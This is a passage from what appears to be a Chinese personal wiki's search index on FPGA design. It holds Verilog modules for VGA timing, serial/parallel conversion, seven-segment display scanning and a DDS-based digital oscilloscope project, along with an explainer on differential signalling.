if (cnt_h == H_TOTAL-1&#x27;d1) cnt_h &lt;= 10&#x27;d0; else cnt_h &lt;= cnt_h + 1&#x27;d1; end // cnt_v列计数器，计数范围0-524并且行计数器计数到799 always @(posedge vga_clk or negedge rstn) begin if(!rstn) cnt_v &lt;= 10&#x27;d0; else if ((cnt_h == H_TOTAL-1&#x27;d1) &amp;&amp; (cnt_v == V_TOTAL - 1&#x27;d1)) cnt_v &lt;= 10&#x27;d0; else if(cnt_h == H_TOTAL-1&#x27;d1) cnt_v &lt;= cnt_v + 1&#x27;d1; else cnt_v &lt;= cnt_v; end // 定义有效数据范围， assign rgb_valid = ((cnt_h &gt;= H_SYNC + H_BACK + H_LEFT) &amp;&amp; (cnt_h &lt; H_SYNC + H_BACK + H_LEFT + H_VALID) &amp;&amp; (cnt_v &gt;= V_SYNC + V_BACK + V_TOP) &amp;&amp; (cnt_v &lt; V_SYNC + V_BACK + V_TOP + V_VALID)) ? 1&#x27;d1 : 1&#x27;d0; assign pix_data_req = ((cnt_h &gt;= H_SYNC + H_BACK + H_LEFT - 1&#x27;d1) &amp;&amp; (cnt_h &lt; H_SYNC + H_BACK + H_LEFT + H_VALID -1&#x27;d1) &amp;&amp; (cnt_v &gt;= V_SYNC + V_BACK + V_TOP) &amp;&amp; (cnt_v &lt; V_SYNC + V_BACK + V_TOP + V_VALID)) ? 1&#x27;d1 : 1&#x27;d0; assign pix_x = (pix_data_req == 1&#x27;d1) ? (cnt_h - (H_SYNC + H_BACK + H_LEFT - 1&#x27;d1)) : 10&#x27;h3ff; assign pix_y = (pix_data_req == 1&#x27;d1) ? (cnt_v - (V_SYNC + V_BACK + V_TOP)) : 10&#x27;h3ff; assign hsync = (cnt_h &lt;= H_SYNC - 1&#x27;d1) ? 1&#x27;d1 : 1&#x27;d0; assign vsync = (cnt_v &lt;= V_SYNC - 1&#x27;d1) ? 1&#x27;d1 : 1&#x27;d0; assign vga_rgb = (rgb_valid == 1&#x27;d1) ? pix_data : 8&#x27;h0000; endmodule 参考链接 66-第二十九讲-VGA显示器驱动设计与验证（一）_哔哩哔哩_bilibili"},{"title":"基于ROM的VGA图像显示","path":"/wiki/FPGA/基于ROM的VGA图像显示.html","content":"开发中···基于ROM的VGA图像显示.md"},{"title":"差分对和差分信号","path":"/wiki/FPGA/差分对和差分信号.html","content":"20240515142253 16px 差分信号是一种在电子学和通信中广泛使用的技术，它通过传输两个等幅、反相的信号来提高信号的抗干扰能力。下面是关于差分信号的基本原理、简介以及应用的详细解释： 基本原理差分信号的核心原理是利用两个信号之间的差异来传输信息，而不是单个信号的绝对值。在差分信号中，有两条线路，一条称为正信号（+），另一条称为负信号（-）。这两条线路上传输的信号是等幅的，但相位相反。 例如，如果正信号是 V，那么负信号就是 -V。当接收端接收到这两个信号时，它会计算两者之间的差值。由于外界的干扰（如电磁干扰）通常同时影响两条线路，因此差值不会受到干扰的影响，从而提高了信号的可靠性。 简介差分信号的概念可以追溯到19世纪，但直到20世纪末，随着电子设备速度的提高和对信号完整性要求的增加，差分信号在高速通信和数据传输中变得越来越重要。 差分信号有以下几个关键特点： 抗干扰性：由于差分信号的抗干扰特性，它在长距离传输和高速数据传输中非常有用。 信号完整性：差分信号有助于保持信号的完整性，减少信号失真。 功率效率：在某些情况下，差分信号可以提高功率传输效率。 简化设计：差分信号可以简化电路设计，因为不需要复杂的匹配或平衡技术。 应用差分信号在许多领域都有应用，包括但不限于： 高速串行通信：如USB、SATA、Ethernet等，它们利用差分信号来提高数据传输速率和可靠性。 无线通信：在无线通信中，差分信号可以提高信号的接收质量。 模拟信号传输：在模拟信号传输中，差分信号用于减少噪声和提高信号的信噪比。 医疗设备：在医疗成像和监测设备中，差分信号有助于提高信号的准确性和稳定性。 消费电子：在消费电子产品中，如音频和视频传输，差分信号可以减少电磁干扰，提高音质和画质。 差分对差分对是实现差分信号的物理基础，它由一对平行的导线组成，这两条导线上传输的信号是等幅反相的。差分对的设计需要考虑许多因素，包括导线的长度、间距、阻抗匹配等，以确保信号的完整性和最小化串扰。 在设计差分信号系统时，工程师会特别注意差分对的布局和走线，以减少串扰和提高信号的抗干扰能力。 结论差分信号是一种强大的技术，它通过传输两个等幅反相的信号来提高信号的抗干扰能力和可靠性。这种技术在高速和长距离数据传输中尤为重要，并且在现代电子和通信系统中得到了广泛的应用。 参考资料 技术干货 | 细说差分信号 - 知乎 (zhihu.com) Kimi人工智能"},{"title":"并行数据转为串行数据","path":"/wiki/FPGA/并行数据转为串行数据.html","content":"参考资料串并转换（串入并出、并入串出、移位寄存器法和计数器法 8位宽的并行输入数据转换为串行数据输出需要添加额外start信号，当拉高start信号时，开始转换数据 在Verilog中，实现一个8位宽的并行输入数据转换为串行数据输出的过程通常称为串行化（Serialization）。以下是一个简单的Verilog模块示例，它实现了这个功能： main.vmodule ParallelToSerial( input wire clk, // 时钟信号 input wire rst_n, // 复位信号（低电平有效） input wire [7:0] data_in, // 8位并行数据输入 input wire start, // 开始转换信号 output reg serial_out // 串行数据输出 ); reg [7:0] shift_reg; // 移位寄存器，用于存储并行数据 reg [2:0] bit_cnt; // 位计数器，用于跟踪当前输出的位 // 在每个时钟上升沿处理数据 always @(posedge clk or negedge rst_n) begin if (!rst_n) begin // 同步复位 shift_reg &lt;= 8&#x27;b0; bit_cnt &lt;= 3&#x27;b0; serial_out &lt;= 1&#x27;b0; end else if (start) begin // 将并行数据加载到移位寄存器 shift_reg &lt;= data_in; bit_cnt &lt;= 3&#x27;d7; // 初始化位计数器为7（从最高位开始） end else if (bit_cnt &gt; 0) begin // 移位输出并行数据到串行输出 serial_out &lt;= shift_reg[7]; // 输出最高位 shift_reg &lt;= shift_reg &lt;&lt; 1; // 左移移位寄存器 bit_cnt &lt;= bit_cnt - 1; // 减少位计数器 end end endmodule 这个模块的工作流程如下： 输入信号：模块接受一个时钟信号clk，一个低电平有效的复位信号rst_n，8位并行数据输入data_in，以及一个开始转换信号start。 寄存器定义：定义了一个8位的移位寄存器shift_reg来存储并行数据，以及一个3位的位计数器bit_cnt来跟踪当前输出的位。 处理逻辑： 当复位信号rst_n为低电平时，所有寄存器被清零。 当start信号变为高电平时，将并行数据加载到移位寄存器shift_reg中，并设置位计数器bit_cnt为7，表示从最高位开始输出。 在每个时钟周期，如果位计数器bit_cnt大于0，模块将移位寄存器的最高位输出到serial_out，然后将移位寄存器左移一位，并减少位计数器的值。 输出：serial_out为串行数据输出，它将按照位的顺序依次输出data_in中的每一位。 请注意，这个模块假设start信号会在每次需要开始新的串行转换时被激活，并且在转换过程中保持激活状态。此外，这个模块没有实现数据同步或时钟域交叉，这在实际应用中可能需要额外的考虑。 串行数据输入转换为8位宽并行数据输出main.vmodule SerialToParallel( input wire clk, // 时钟信号 input wire rst_n, // 复位信号（低电平有效） input wire serial_in, // 串行数据输入 output reg [7:0] data_out, // 8位并行数据输出 output reg done // 转换完成信号 ); reg [7:0] shift_reg; // 移位寄存器，用于存储串行数据 reg [2:0] bit_cnt; // 位计数器，用于跟踪当前存储的位数 // 在每个时钟上升沿处理数据 always @(posedge clk or negedge rst_n) begin if (!rst_n) begin // 同步复位 shift_reg &lt;= 8&#x27;b0; bit_cnt &lt;= 3&#x27;b0; done &lt;= 1&#x27;b0; end else begin // 移位输入串行数据到移位寄存器 shift_reg &lt;= &#123;shift_reg[6:0], serial_in&#125;; // 右移移位寄存器，并添加新的串行输入位 if (bit_cnt &lt; 7) begin bit_cnt &lt;= bit_cnt + 1; // 增加位计数器 end else begin // 当接收到8位数据后，将移位寄存器的内容输出到并行数据输出 data_out &lt;= shift_reg; done &lt;= 1&#x27;b1; // 标记转换完成 bit_cnt &lt;= 3&#x27;b0; // 重置位计数器 end end end endmodule"},{"title":"时序约束","path":"/wiki/FPGA/时序约束.html","content":"开发中···时序约束.md"},{"title":"数字电路基础","path":"/wiki/FPGA/数字电路基础.html","content":"开发中···数字电路基础.md 本文主要介绍数字电路基础知识，用最简洁的内容介绍最核心的知识。"},{"title":"数码管动态显示","path":"/wiki/FPGA/数码管动态显示.html","content":"演示视频，下载下来观看 seg.vmodule top( clk, //系统输入时钟 rst_n,//系统复位 segdata,//数码管段选 segcs//数码管位选 ); input clk; input rst_n; output reg [7:0]segdata; output reg [2:0]segcs; reg[31:0] count; reg[24:0]count1ms; reg[2:0]number; reg[19:0]tenvalue; reg clk1ms; parameter sample=2&#x27;b00, display=2&#x27;b01; //-----------数码管驱动时钟----------- always@(posedge clk) begin if(count1ms&gt;25&#x27;d1000_0) begin clk1ms&lt;=~clk1ms; count1ms&lt;=0; end else count1ms&lt;=count1ms+1; end //-----------从0开始显示数字----------- always@(posedge clk1ms or negedge rst_n) if(!rst_n) tenvalue &lt;= 20&#x27;d0; else if(tenvalue == 20&#x27;d999999) tenvalue &lt;= 20&#x27;d0; else tenvalue &lt;= tenvalue + 1&#x27;d1; //-----------数码管译码----------- function[7:0] leddata; input[3:0] datain; begin case(datain) 4&#x27;d0: leddata=8&#x27;b11000000;//0 4&#x27;d1: leddata=8&#x27;b11111001;//1 4&#x27;d2: leddata=8&#x27;b10100100;//2 4&#x27;d3: leddata=8&#x27;b10110000;//3 4&#x27;d4: leddata=8&#x27;b10011001;//4 4&#x27;d5: leddata=8&#x27;b10010010;//5 4&#x27;d6: leddata=8&#x27;b10000010;//6 4&#x27;d7: leddata=8&#x27;b11111000;//7 4&#x27;d8: leddata=8&#x27;b10000000;//8 4&#x27;d9: leddata=8&#x27;b10010000;//9 4&#x27;d10: leddata=8&#x27;b10111111;//- 4&#x27;d11: leddata=8&#x27;b01111111;//. default:leddata=8&#x27;bzzzz_zzzz; endcase end endfunction //-----------数码管扫描----------- always@(posedge clk1ms) begin if(number==3&#x27;d6) number&lt;=0; else begin number&lt;=number+1; case(number) 4&#x27;d0: begin segdata&lt;=leddata((tenvalue/10)%10);//个位 segcs&lt;=3&#x27;b101; end 4&#x27;d1: begin segdata&lt;=leddata((tenvalue/100)%10);//十位 segcs&lt;=3&#x27;b100; end 4&#x27;d2: begin segdata&lt;=leddata((tenvalue/1000)%10); //百位 segcs&lt;=3&#x27;b011; end 4&#x27;d3: begin segdata&lt;=leddata((tenvalue/10000)%10);//千位 segcs&lt;=3&#x27;b010; end 4&#x27;d4: begin segdata&lt;=leddata((tenvalue/100000)%10);//万位 segcs&lt;=3&#x27;b001; end 4&#x27;d5: begin segdata&lt;=leddata((tenvalue/1000000)%10);//十万位 segcs&lt;=3&#x27;b000; end endcase end end endmodule 20240519203635"},{"title":"状态机相关知识","path":"/wiki/FPGA/状态机相关知识.html","content":"开发中···状态机相关知识.md"},{"title":"电路的动态特性","path":"/wiki/FPGA/电路的动态特性.html","content":"开发中···电路的动态特性.md"},{"title":"笔试题目汇总","path":"/wiki/FPGA/笔试题目汇总.html","content":"开发中···笔试题目汇总.md"},{"title":"数字示波器设计","path":"/wiki/FPGA/数字示波器设计.html","content":"效果模块框图 Your browser does not support the video tag. 储备知识 FFT IP核的调用。用来求出AD输入波形的峰峰值 RAM、ROM IP核的调用，存储波形和文字信息 VGA视频传输协议的时序设计 DAC芯片的时序设计。DDS 信号发生器的设计，产生不同的测试波形 PLL IP核的调用，产生不同频率的时钟 Seg 6位数码管的动态驱动设计，显示频率信息 程序程序比较乱，没有进行优化，有时间去整理一下 seg.vmodule seg( input clk, input rst_n, input [19:0] tenvalue, output reg [7:0] segdata, output reg [2:0] segcs ); reg [24:0] count1ms; reg [2:0] number = 3&#x27;b0; reg clk1ms = 1&#x27;b0; parameter sample=2&#x27;b00, display=2&#x27;b01; //-----------数码管驱动时钟----------- always @(posedge clk or negedge rst_n) begin if (!rst_n) begin clk1ms &lt;= 1&#x27;b0; count1ms &lt;= 0; end else begin if (count1ms &gt;= 25&#x27;d50000) begin // 1ms的计数器 clk1ms &lt;= ~clk1ms; count1ms &lt;= 0; end else begin count1ms &lt;= count1ms + 1&#x27;b1; end end end //-----------数码管译码----------- function [7:0] leddata; input [3:0] datain; begin case (datain) 4&#x27;d0: leddata = 8&#x27;b11000000; // 0 4&#x27;d1: leddata = 8&#x27;b11111001; // 1 4&#x27;d2: leddata = 8&#x27;b10100100; // 2 4&#x27;d3: leddata = 8&#x27;b10110000; // 3 4&#x27;d4: leddata = 8&#x27;b10011001; // 4 4&#x27;d5: leddata = 8&#x27;b10010010; // 5 4&#x27;d6: leddata = 8&#x27;b10000010; // 6 4&#x27;d7: leddata = 8&#x27;b11111000; // 7 4&#x27;d8: leddata = 8&#x27;b10000000; // 8 4&#x27;d9: leddata = 8&#x27;b10010000; // 9 4&#x27;d10: leddata = 8&#x27;b10111111; // - 4&#x27;d11: leddata = 8&#x27;b01111111; // . default: leddata = 8&#x27;b11111111; endcase end endfunction //-----------数码管扫描----------- always @(posedge clk1ms or negedge rst_n) begin if (!rst_n) begin number &lt;= 3&#x27;d0; end else begin if (number == 3&#x27;d5) begin number &lt;= 3&#x27;d0; end else begin number &lt;= number + 1; end case (number) 3&#x27;d0: begin segdata &lt;= leddata(tenvalue % 10); // 个位 segcs &lt;= 3&#x27;b101; end 3&#x27;d1: begin segdata &lt;= leddata((tenvalue / 10) % 10); // 十位 segcs &lt;= 3&#x27;b100; end 3&#x27;d2: begin segdata &lt;= leddata((tenvalue / 100) % 10); // 百位 segcs &lt;= 3&#x27;b011; end 4&#x27;d3: begin segdata &lt;= leddata((tenvalue / 1000) % 10); // 千位 segcs &lt;= 3&#x27;b010; end 4&#x27;d4: begin segdata &lt;= leddata((tenvalue / 10000) % 10); // 万位 segcs &lt;= 3&#x27;b001; end 4&#x27;d5: begin segdata &lt;= leddata((tenvalue / 100000) % 10); // 十万位 segcs &lt;= 3&#x27;b000; end default: begin segdata &lt;= 8&#x27;b11111111; // 或者其他默认值 segcs &lt;= 3&#x27;b111; // 或者其他默认值 end endcase end end endmodule freq_meter_calc.v`timescale 1ns/1ns module freq_meter_calc ( input wire sys_clk , input wire sys_rst_n , input wire clk_test , //待检测时钟 output reg [19:0] freq //待检测时钟频率 ); parameter CNT_GATE_S_MAX = 28&#x27;d37_499_999 , //软件闸门计数器计数最大值 1.5s CNT_RISE_MAX = 28&#x27;d6_250_000 ; //软件闸门拉高计数值, 1.25s parameter CLK_STAND_FREQ = 28&#x27;d100_000_000 ; //标准时钟时钟频率, 100Mhz wire clk_stand ; wire gate_a_flag_s ; wire gate_a_flag_t ; reg [27:0] cnt_gate_s ; reg gate_s ; reg gate_a ; reg gate_a_test ; reg gate_a_stand ; reg gate_a_stand_reg ; reg gate_a_test_reg ; reg [47:0] cnt_clk_stand ; reg [47:0] cnt_clk_stand_reg ; reg [47:0] cnt_clk_test ; reg [47:0] cnt_clk_test_reg ; reg calc_flag ; reg [63:0] freq_reg ; reg calc_flag_reg ; //step1:按照原理生成软件闸门、实际闸门 //cnt_gate_s:软件闸门计数器 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_gate_s &lt;= 28&#x27;d0; else if(cnt_gate_s == CNT_GATE_S_MAX) cnt_gate_s &lt;= 28&#x27;d0; else cnt_gate_s &lt;= cnt_gate_s + 1&#x27;b1; //gate_s:软件闸门 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_s &lt;= 1&#x27;b0; else if((cnt_gate_s&gt;= CNT_RISE_MAX) &amp;&amp; (cnt_gate_s &lt;= (CNT_GATE_S_MAX - CNT_RISE_MAX))) gate_s &lt;= 1&#x27;b1; else gate_s &lt;= 1&#x27;b0; //gate_a:实际闸门 always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_a &lt;= 1&#x27;b0; else gate_a &lt;= gate_s; //step2：得到待测信号的周期数 X always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_a_test &lt;= 1&#x27;b0; else gate_a_test &lt;= gate_a; //gate_a_test:实际闸门打一拍(待检测时钟下) always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_a_test_reg &lt;= 1&#x27;b0; else gate_a_test_reg &lt;= gate_a_test; //cnt_clk_test:待检测时钟周期计数器,计数实际闸门下待检测时钟周期数。 x++ always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_clk_test &lt;= 48&#x27;d0; else if(gate_a_test == 1&#x27;b0) cnt_clk_test &lt;= 48&#x27;d0; else if(gate_a_test == 1&#x27;b1) cnt_clk_test &lt;= cnt_clk_test + 1&#x27;b1; //gate_a_flag_t:实际闸门下降沿(待检测时钟下) assign gate_a_flag_t = ((gate_a_test_reg == 1&#x27;b1) &amp;&amp; (gate_a_test == 1&#x27;b0)) ? 1&#x27;b1 : 1&#x27;b0; //cnt_clk_test_reg:实际闸门下待检测时钟周期数, x always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_clk_test_reg &lt;= 32&#x27;d0; else if(gate_a_flag_t == 1&#x27;b1) cnt_clk_test_reg &lt;= cnt_clk_test; //step3：得到标准信号的周期数 y //使用PLL ipcore生成100Mhz信号 clk_gen clk_gen_inst ( .areset (~sys_rst_n ), .inclk0 (sys_clk ), .c0 (clk_stand ) ); //gate_a_stand:实际闸门打一拍(标准时钟下) always@(posedge clk_stand or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_a_stand &lt;= 1&#x27;b0; else gate_a_stand &lt;= gate_a_test; always@(posedge clk_stand or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_a_stand_reg &lt;= 1&#x27;b0; else gate_a_stand_reg &lt;= gate_a_stand; //gate_a_flag_s:实际闸门下降沿(标准时钟下) assign gate_a_flag_s = ((gate_a_stand_reg == 1&#x27;b1) &amp;&amp; (gate_a_stand == 1&#x27;b0)) ? 1&#x27;b1 : 1&#x27;b0; //cnt_clk_stand:标准时钟周期计数器,计数实际闸门下标准时钟周期数。 y++ always@(posedge clk_stand or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_clk_stand &lt;= 48&#x27;d0; else if(gate_a_stand == 1&#x27;b0) cnt_clk_stand &lt;= 48&#x27;d0; else if(gate_a_stand == 1&#x27;b1) cnt_clk_stand &lt;= cnt_clk_stand + 1&#x27;b1; //cnt_clk_stand_reg:实际闸门下标志时钟周期数 always@(posedge clk_stand or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_clk_stand_reg &lt;= 32&#x27;d0; else if(gate_a_flag_s == 1&#x27;b1) cnt_clk_stand_reg &lt;= cnt_clk_stand; //step4: 利用公式进行频率计算 //calc_flag:待检测时钟时钟频率计算标志信号 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) calc_flag &lt;= 1&#x27;b0; else if(cnt_gate_s == (CNT_GATE_S_MAX - 1&#x27;b1)) calc_flag &lt;= 1&#x27;b1; else calc_flag &lt;= 1&#x27;b0; //freq:待检测时钟信号时钟频率 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) freq_reg &lt;= 64&#x27;d0; else if(calc_flag == 1&#x27;b1) freq_reg &lt;= (CLK_STAND_FREQ * cnt_clk_test_reg / cnt_clk_stand_reg ); // (100MHZ*X)/Y //calc_flag_reg:待检测时钟频率输出标志信号 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) calc_flag_reg &lt;= 1&#x27;b0; else calc_flag_reg &lt;= calc_flag; //freq:待检测时钟信号时钟频率 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) freq &lt;= 19&#x27;d0; else if(calc_flag_reg == 1&#x27;b1) freq &lt;= (CLK_STAND_FREQ * cnt_clk_test_reg / (cnt_clk_stand_reg) ); endmodule key_control.v`timescale 1ns/1ns ///////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/07/10 // Module Name : key_control // Project Name : top_dds // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : 按键控制模块,控制波形选择 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征途Pro_FPGA开发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module key_control ( input wire sys_clk , //系统时钟,50MHz input wire sys_rst_n , //复位信号,低电平有效 input wire [3:0] key , //输入4位按键 output reg [3:0] wave_select //输出波形选择 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //parameter define parameter sin_wave = 4&#x27;b0001, //正弦波 squ_wave = 4&#x27;b0010, //方波 tri_wave = 4&#x27;b0100, //三角波 saw_wave = 4&#x27;b1000; //锯齿波 parameter CNT_MAX = 20&#x27;d999_999; //计数器计数最大值 //wire define wire key3 ; //按键3 wire key2 ; //按键2 wire key1 ; //按键1 wire key0 ; //按键0 //********************************************************************// //***************************** Main Code ****************************// //********************************************************************// //wave:按键状态对应波形 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) wave_select &lt;= 4&#x27;b0000; else if(key0 == 1&#x27;b1) wave_select &lt;= sin_wave; else if(key1 == 1&#x27;b1) wave_select &lt;= squ_wave;// 锯齿波 else if(key2 == 1&#x27;b1) wave_select &lt;= tri_wave;// 三角波 else if(key3 == 1&#x27;b1) wave_select &lt;= saw_wave; else wave_select &lt;= wave_select; //********************************************************************// //*************************** Instantiation **************************// //********************************************************************// //------------- key_fifter_inst3 -------------- key_filter #( .CNT_MAX (CNT_MAX ) //计数器计数最大值 ) key_filter_inst3 ( .sys_clk (sys_clk ) , //系统时钟50Mhz .sys_rst_n (sys_rst_n) , //全局复位 .key_in (key[3] ) , //按键输入信号 .key_flag (key3 ) //按键消抖后标志信号 ); //------------- key_fifter_inst2 -------------- key_filter #( .CNT_MAX (CNT_MAX ) //计数器计数最大值 ) key_filter_inst2 ( .sys_clk (sys_clk ) , //系统时钟50Mhz .sys_rst_n (sys_rst_n) , //全局复位 .key_in (key[2] ) , //按键输入信号 .key_flag (key2 ) //按键消抖后标志信号 ); //------------- key_fifter_inst1 -------------- key_filter #( .CNT_MAX (CNT_MAX ) //计数器计数最大值 ) key_filter_inst1 ( .sys_clk (sys_clk ) , //系统时钟50Mhz .sys_rst_n (sys_rst_n) , //全局复位 .key_in (key[1] ) , //按键输入信号 .key_flag (key1 ) //按键消抖后标志信号 ); //------------- key_fifter_inst0 -------------- key_filter #( .CNT_MAX (CNT_MAX ) //计数器计数最大值 ) key_filter_inst0 ( .sys_clk (sys_clk ) , //系统时钟50Mhz .sys_rst_n (sys_rst_n) , //全局复位 .key_in (key[0] ) , //按键输入信号 .key_flag (key0 ) //按键消抖后标志信号 ); endmodule dds.vmodule dds ( input wire sys_clk , //系统时钟,50MHz input wire sys_rst_n , //复位信号,低电平有效 input wire [3:0] wave_select , //输出波形选择 output wire [7:0] data_out //波形输出 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //parameter define parameter sin_wave = 4&#x27;b0001 , //正弦波 squ_wave = 4&#x27;b0010 , //方波 tri_wave = 4&#x27;b0100 , //三角波 saw_wave = 4&#x27;b1000 ; //锯齿波 parameter FREQ_CTRL = 32&#x27;d42949 , //相位累加器单次累加值 PHASE_CTRL = 12&#x27;d1024 ; //相位偏移量 //reg define reg [31:0] fre_add ; //相位累加器 reg [11:0] rom_addr_reg; //相位调制后的相位码 reg [13:0] rom_addr ; //ROM读地址 //********************************************************************// //***************************** Main Code ****************************// //********************************************************************// //fre_add:相位累加器 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) fre_add &lt;= 32&#x27;d0; else fre_add &lt;= fre_add + FREQ_CTRL; //rom_addr:ROM读地址 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) begin rom_addr &lt;= 14&#x27;d0; rom_addr_reg &lt;= 11&#x27;d0; end else case(wave_select) sin_wave: begin rom_addr_reg &lt;= fre_add[31:20] + PHASE_CTRL; rom_addr &lt;= rom_addr_reg; end //正弦波 squ_wave: begin rom_addr_reg &lt;= fre_add[31:20] + PHASE_CTRL; rom_addr &lt;= rom_addr_reg + 14&#x27;d4096; end //方波 tri_wave: begin rom_addr_reg &lt;= fre_add[31:20] + PHASE_CTRL; rom_addr &lt;= rom_addr_reg + 14&#x27;d8192; end //三角波 saw_wave: begin rom_addr_reg &lt;= fre_add[31:20] + PHASE_CTRL; rom_addr &lt;= rom_addr_reg + 14&#x27;d12288; end //锯齿波 default: begin rom_addr_reg &lt;= fre_add[31:20] + PHASE_CTRL; rom_addr &lt;= rom_addr_reg; end //正弦波 endcase //********************************************************************// //*************************** Instantiation **************************// //********************************************************************// //------------------------- rom_wave_inst ------------------------ rom_wave rom_wave_inst ( .address (rom_addr ), //ROM读地址 .clock (sys_clk ), //读时钟 .q (data_out ) //读出波形数据 ); endmodule key_filter.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/03/15 // Module Name : key_filter // Project Name : top_dds // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : 按键消抖模块 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征途Pro_FPGA开发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module key_filter #( parameter CNT_MAX = 20&#x27;d999_999 //计数器计数最大值 ) ( input wire sys_clk , //系统时钟50Mhz input wire sys_rst_n , //全局复位 input wire key_in , //按键输入信号 output reg key_flag //key_flag为1时表示消抖后检测到按键被按下 //key_flag为0时表示没有检测到按键被按下 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //reg define reg [19:0] cnt_20ms ; //计数器 //********************************************************************// //***************************** Main Code ****************************// //********************************************************************// //cnt_20ms:如果时钟的上升沿检测到外部按键输入的值为低电平时，计数器开始计数 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_20ms &lt;= 20&#x27;b0; else if(key_in == 1&#x27;b1) cnt_20ms &lt;= 20&#x27;b0; else if(cnt_20ms == CNT_MAX &amp;&amp; key_in == 1&#x27;b0) cnt_20ms &lt;= cnt_20ms; else cnt_20ms &lt;= cnt_20ms + 1&#x27;b1; //key_flag:当计数满20ms后产生按键有效标志位 //且key_flag在999_999时拉高,维持一个时钟的高电平 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) key_flag &lt;= 1&#x27;b0; else if(cnt_20ms == CNT_MAX - 1&#x27;b1) key_flag &lt;= 1&#x27;b1; else key_flag &lt;= 1&#x27;b0; endmodule serial_output.vmodule serial_output ( input wire sys_clk , // 系统时钟 input wire sys_rst_n , // 复位信号，低电平有效 input wire [7:0] dac_data , // 8位并行数据输入 output reg serial_out // 串行数据输出 ); // 寄存器和参数定义 reg [2:0] bit_count; // 位计数器，用于追踪当前正在输出的位 reg [7:0] data_reg; // 数据寄存器，用于暂存dac_data // 时钟上升沿触发的逻辑 always @(posedge sys_clk or negedge sys_rst_n) begin if (!sys_rst_n) begin // 复位逻辑 bit_count &lt;= 3&#x27;b0; data_reg &lt;= 8&#x27;b0; serial_out &lt;= 1&#x27;b0; end else begin // 串行输出逻辑 if (bit_count == 3&#x27;b111) begin // 如果所有位都已输出，则重新加载数据并重置计数器 bit_count &lt;= 3&#x27;b0; data_reg &lt;= dac_data; end else begin // 输出当前最高位，并将数据左移一位 serial_out &lt;= data_reg[7]; data_reg &lt;= data_reg &lt;&lt; 1; bit_count &lt;= bit_count + 1; end end end endmodule tlc5620_driver.vmodule tlc5620_driver ( input CLOCK_50, input RST_N, // input da_enable, input da_range, // 0, 1倍参考电压; 1, 2倍参考电压 input [7:0] da0_data, // 0~255 input [7:0] da1_data, // 0~255 input [7:0] da2_data, // 0~255 input [7:0] da3_data, // 0~255 // output reg SCK, output reg SDI, output reg LOAD ); function integer log2(input integer n); integer i; for(i=0; 2**i &lt;=n; i=i+1) log2=i+1; endfunction /************************************** * 生成140ns的tick时钟 **************************************/ reg [log2(7):1]cnt_140ns; always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) cnt_140ns &lt;= 0; else begin if(cnt_140ns &lt; 6) cnt_140ns &lt;= cnt_140ns + 1&#x27;b1; else cnt_140ns &lt;= 0; end wire tick_140ns = (cnt_140ns == 6) ? 1 : 0; /************************************** * 根据tick时钟生成da基准计数器 **************************************/ reg [log2(48):1] da_ref_cnt; // [0,47] always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) da_ref_cnt &lt;= 0; else begin if(!da_enable) da_ref_cnt &lt;= 0; else begin if(tick_140ns) begin if(da_ref_cnt &lt; 47) da_ref_cnt &lt;= da_ref_cnt + 1&#x27;b1; else da_ref_cnt &lt;= 0; end end end wire tick_6720ns = (da_ref_cnt == 47) ? 1 : 0; reg [1:0] da_sel_cnt; always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) da_sel_cnt &lt;= 2&#x27;b0; else if (tick_6720ns) begin if(da_sel_cnt &lt; 3) da_sel_cnt &lt;= da_sel_cnt + 1&#x27;b1; else da_sel_cnt &lt;= 2&#x27;b0; end /************************************** * 根据基准计数器生成串行信号 **************************************/ reg [7:0] da_data; always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) da_data &lt;= 8&#x27;b0; else begin case(da_sel_cnt) 2&#x27;b00: da_data &lt;= da0_data; 2&#x27;b01: da_data &lt;= da1_data; 2&#x27;b10: da_data &lt;= da2_data; 2&#x27;b11: da_data &lt;= da3_data; endcase end always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) begin SCK &lt;= 0; SDI &lt;= 0; LOAD 